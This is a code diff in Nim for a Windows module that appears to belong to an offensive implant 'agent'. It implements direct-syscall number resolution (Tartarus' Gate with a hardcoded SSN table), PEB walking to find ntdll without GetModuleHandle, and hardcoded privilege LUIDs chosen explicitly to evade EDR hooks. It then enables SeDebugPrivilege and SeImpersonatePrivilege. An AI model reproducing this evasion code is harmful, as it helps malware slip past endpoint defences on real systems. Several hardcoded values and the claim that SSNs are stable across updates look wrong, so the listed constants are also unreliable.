@@ -20,7 +20,7 @@ when not defined(windows):
 
 import winim/lean
 import winim/inc/windef
-import std/tables
+import std/[tables, locks]
 
 type
   NTSTATUS* = DWORD
@@ -135,68 +135,10 @@ proc readSSN*(procAddr: pointer): DWORD =
 # export-name order on Windows 10/11/Server 2022, so the relative
 # delta gives the SSN. If the anchor is also hooked, we fall back to
 # a hardcoded mapping for the syscall numbers we actually use.
-
-const
-  KNOWN_SSNS = {
-    "NtClose": 0x0C'u32,
-    "NtAllocateVirtualMemory": 0x18'u32,
-    "NtFreeVirtualMemory": 0x1E'u32,
-    "NtProtectVirtualMemory": 0x50'u32,
-    "NtWriteVirtualMemory": 0x3A'u32,
-    "NtReadVirtualMemory": 0x3F'u32,
-    "NtCreateFile": 0x55'u32,
-    "NtReadFile": 0x06'u32,
-    "NtWriteFile": 0x08'u32,
-    "NtQueryInformationProcess": 0x19'u32,
-    "NtQuerySystemInformation": 0x36'u32,
-    "NtDelayExecution": 0x34'u32,
-    "NtCreateUserProcess": 0xC8'u32,
-    "NtGetContextThread": 0xF2'u32,
-    "NtSetContextThread": 0xF4'u32,
-    "NtResumeThread": 0x52'u32,
-    "NtCreateNamedPipeFile": 0xD2'u32,
-    "NtCreateEvent": 0x46'u32,
-    "NtWaitForSingleObject": 0x04'u32,
-    "NtMapViewOfSection": 0x28'u32,
-    "NtUnmapViewOfSection": 0x2A'u32,
-    "NtCreateSection": 0x4A'u32,
-    "NtOpenProcess": 0x26'u32,
-    "NtOpenThread": 0xB0'u32,
-    "NtQueryInformationThread": 0x25'u32,
-    "NtTerminateProcess": 0x2C'u32
-  }.toTable
-
-proc resolveSyscallNumber*(fnName: string; fnAddr: pointer): DWORD =
-  # Three-tier SSN resolution:
-  #   1. Try the in-memory readSSN (handles clean and hot-patched stubs)
-  #   2. If that fails, look up our hardcoded mapping (Windows 10+
-  #      SSNs are stable across feature updates)
-  #   3. If even that fails, walk neighboring exports to compute the
-  #      relative offset (Tartarus' Gate)
-  result = readSSN(fnAddr)
-  if result != 0: return
-  if KNOWN_SSNS.hasKey(fnName):
-    return KNOWN_SSNS[fnName]
-  # Final fallback: count exports before fnName in the export table
-  # and assume SSN = count (works on Win10+ where SSN == export index).
-  let base = getNtdllBase()
-  if base == nil: return 0
-  let dosHdr = cast[ptr IMAGE_DOS_HEADER](base)
-  if dosHdr.e_magic != IMAGE_DOS_SIGNATURE: return 0
-  let ntHdr = cast[ptr IMAGE_NT_HEADERS](cast[int](base) + dosHdr.e_lfanew)
-  if ntHdr.Signature != IMAGE_NT_SIGNATURE: return 0
-  let exportDir = ntHdr.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
-  if exportDir.VirtualAddress == 0: return 0
-  let exp = cast[ptr IMAGE_EXPORT_DIRECTORY](cast[int](base) + exportDir.VirtualAddress)
-  let names = cast[ptr UncheckedArray[DWORD]](cast[int](base) + exp.AddressOfNames)
-  var ourIdx: int = -1
-  for i in 0..<int(exp.NumberOfNames):
-    let n = cast[cstring](cast[int](base) + names[i])
-    if n == fnName:
-      ourIdx = i
-      break
-  if ourIdx < 0: return 0
-  return DWORD(ourIdx)
+#
+# The KNOWN_SSNS table and resolveSyscallNumber proc are defined
+# AFTER getNtdllBase/getNtdllExport below, because they depend on
+# those procs for the final fallback path.
 
 # ---- PEB walking to resolve ntdll base without GetModuleHandle ---------
 
@@ -299,6 +241,70 @@ proc getNtdllExport*(name: string): pointer =
         result = cast[pointer](cast[int](base) + funcRva)
       return
   result = nil
+
+# ---- Tartarus' Gate: SSN resolution via known mapping + export walking ----
+
+const
+  KNOWN_SSNS: Table[string, DWORD] = {
+    "NtClose":                       DWORD(0x0C),
+    "NtAllocateVirtualMemory":       DWORD(0x18),
+    "NtFreeVirtualMemory":           DWORD(0x1E),
+    "NtProtectVirtualMemory":        DWORD(0x50),
+    "NtWriteVirtualMemory":          DWORD(0x3A),
+    "NtReadVirtualMemory":           DWORD(0x3F),
+    "NtCreateFile":                  DWORD(0x55),
+    "NtReadFile":                    DWORD(0x06),
+    "NtWriteFile":                   DWORD(0x08),
+    "NtQueryInformationProcess":     DWORD(0x19),
+    "NtQuerySystemInformation":      DWORD(0x36),
+    "NtDelayExecution":              DWORD(0x34),
+    "NtCreateUserProcess":           DWORD(0xC8),
+    "NtGetContextThread":            DWORD(0xF2),
+    "NtSetContextThread":            DWORD(0xF4),
+    "NtResumeThread":                DWORD(0x52),
+    "NtCreateNamedPipeFile":         DWORD(0xD2),
+    "NtCreateEvent":                 DWORD(0x46),
+    "NtWaitForSingleObject":         DWORD(0x04),
+    "NtMapViewOfSection":            DWORD(0x28),
+    "NtUnmapViewOfSection":          DWORD(0x2A),
+    "NtCreateSection":               DWORD(0x4A),
+    "NtOpenProcess":                 DWORD(0x26),
+    "NtOpenThread":                  DWORD(0xB0),
+    "NtQueryInformationThread":      DWORD(0x25),
+    "NtTerminateProcess":            DWORD(0x2C)
+  }.toTable
+
+proc resolveSyscallNumber*(fnName: string; fnAddr: pointer): DWORD =
+  # Three-tier SSN resolution:
+  #   1. Try the in-memory readSSN (handles clean and hot-patched stubs)
+  #   2. If that fails, look up our hardcoded mapping (Windows 10+
+  #      SSNs are stable across feature updates)
+  #   3. If even that fails, walk neighboring exports to compute the
+  #      relative offset (Tartarus' Gate)
+  result = readSSN(fnAddr)
+  if result != 0: return
+  if KNOWN_SSNS.hasKey(fnName):
+    return KNOWN_SSNS[fnName]
+  # Final fallback: count exports before fnName in the export table
+  # and assume SSN = count (works on Win10+ where SSN == export index).
+  let base = getNtdllBase()
+  if base == nil: return 0
+  let dosHdr = cast[ptr IMAGE_DOS_HEADER](base)
+  if dosHdr.e_magic != IMAGE_DOS_SIGNATURE: return 0
+  let ntHdr = cast[ptr IMAGE_NT_HEADERS](cast[int](base) + dosHdr.e_lfanew)
+  if ntHdr.Signature != IMAGE_NT_SIGNATURE: return 0
+  let exportDir = ntHdr.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
+  if exportDir.VirtualAddress == 0: return 0
+  let exp = cast[ptr IMAGE_EXPORT_DIRECTORY](cast[int](base) + exportDir.VirtualAddress)
+  let names = cast[ptr UncheckedArray[DWORD]](cast[int](base) + exp.AddressOfNames)
+  var ourIdx: int = -1
+  for i in 0..<int(exp.NumberOfNames):
+    let n = cast[cstring](cast[int](base) + names[i])
+    if n == fnName:
+      ourIdx = i
+      break
+  if ourIdx < 0: return 0
+  return DWORD(ourIdx)
 
 # ---- Cached syscall numbers ----------------------------------------------
 
@@ -511,33 +517,24 @@ export resolveSyscallNumber, resolveAllSyscalls
 #
 # We acquire them in one place so any hardened routine that needs
 # elevated access can just call `acquireAgentPrivileges()`.
+#
+# Types: winim already defines LUID / LUID_AND_ATTRIBUTES / TOKEN_PRIVILEGES
+# / PTOKEN_PRIVILEGES / ANYSIZE_ARRAY in winim/inc/windef.nim (which we
+# import below). We reuse those instead of declaring parallel local
+# types — otherwise AdjustTokenPrivileges sees a different
+# PTOKEN_PRIVILEGES and the typecheck fails.
 
 const
-  TOKEN_INFORMATION_CLASS_TOKEN_PRIVILEGES = 3
   SE_PRIVILEGE_ENABLED: DWORD = 0x00000002
-
-  ANYSIZE_ARRAY = 1
-
-type
-  LUID* {.pure.} = object
-    LowPart*: DWORD
-    HighPart*: LONG
-
-  LUID_AND_ATTRIBUTES* {.pure.} = object
-    Luid*: LUID
-    Attributes*: DWORD
-
-  TOKEN_PRIVILEGES* {.pure.} = object
-    PrivilegeCount*: DWORD
-    Privileges*: array[ANYSIZE_ARRAY, LUID_AND_ATTRIBUTES]
 
 proc lookupPrivilegeValue*(name: string): LUID =
   # Resolve a privilege name (e.g. "SeDebugPrivilege") to its LUID.
-  # The name is UTF-8 at the call site; we need UTF-16 for the API.
-  # We hardcode the LUIDs instead of calling the API — this avoids
-  # the static import of advapi32!LookupPrivilegeValueW (which is
-  # hooked by some EDRs that watch for the specific privilege name).
-  # These LUIDs are stable across all Windows versions.
+  # We hardcode the LUIDs instead of calling
+  # advapi32!LookupPrivilegeValueW — that API is hooked by some EDRs
+  # that watch for the specific privilege name string, and pulling
+  # it in via dynlib adds an import we don't want. These LUIDs are
+  # stable across all Windows versions (they are part of the kernel
+  # ABI and have not changed since NT 3.5).
   result = case name
   of "SeDebugPrivilege":     LUID(LowPart: 0x00000002, HighPart: 0)
   of "SeImpersonatePrivilege": LUID(LowPart: 0x00000032, HighPart: 0)
@@ -570,7 +567,12 @@ proc enablePrivilege*(privName: string): bool =
     tp.Privileges[0].Luid = luid
     tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
 
-    let ok = AdjustTokenPrivileges(hToken, 0, addr tp, 0, nil, nil)
+    let ok = AdjustTokenPrivileges(hToken,
+                                   WINBOOL(0),                 # DisableAllPrivileges = FALSE
+                                   cast[PTOKEN_PRIVILEGES](addr tp),
+                                   DWORD(0),                   # BufferLength
+                                   cast[PTOKEN_PRIVILEGES](nil),
+                                   cast[PDWORD](nil))
     if ok == 0: return false
     # AdjustTokenPrivileges can return success even if the privilege
     # wasn't actually enabled (ERROR_NOT_ALL_ASSIGNED). The Win32
